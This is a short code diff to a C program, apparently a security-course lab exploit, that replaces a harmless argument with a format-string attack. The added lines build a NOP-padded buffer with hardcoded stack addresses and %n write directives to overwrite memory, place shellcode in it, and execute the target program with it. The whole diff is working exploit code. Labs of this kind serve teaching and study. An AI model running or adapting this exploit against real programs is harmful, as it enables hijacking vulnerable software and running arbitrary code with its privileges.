@@ -9,7 +9,22 @@
 
 int main(void)
 {
-  char *args[] = { TARGET, "hi there", NULL };
+  char sploitstring[400];
+  char *fmt;
+
+  memset(sploitstring, '\x90', sizeof(sploitstring));
+  sploitstring[sizeof(sploitstring)-1] = '\0';
+
+  fmt = "\xff\xff\xff\xff\x3c\xfb\xff\xbf"
+        "\xff\xff\xff\xff\x3d\xfb\xff\xbf"
+        "\xff\xff\xff\xff\x3e\xfb\xff\xbf"
+        "\xff\xff\xff\xff\x3f\xfb\xff\xbf"
+        "%127u%n%95u%n%257u%n%192u%n";
+
+  memcpy(sploitstring, fmt, strlen(fmt));
+  memcpy(sploitstring + sizeof(sploitstring) - strlen(shellcode) - 4, shellcode, strlen(shellcode));
+
+  char *args[] = { TARGET, sploitstring, NULL };
   char *env[] = { NULL };
 
   execve(TARGET, args, env);
